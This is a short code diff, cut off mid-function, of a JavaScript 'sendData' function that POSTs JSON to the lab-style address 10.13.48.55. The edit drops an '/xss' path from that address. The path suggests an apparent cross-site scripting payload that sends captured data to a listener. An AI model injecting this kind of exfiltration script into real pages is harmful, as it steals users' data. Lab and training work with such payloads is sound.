@@ -1,5 +1,5 @@
 function sendData(data){
-	fetch("http://10.13.48.55/xss", {
+	fetch("http://10.13.48.55", {
 		method: "POST",
 		headers: {
 			"Content-Type": "application/json"
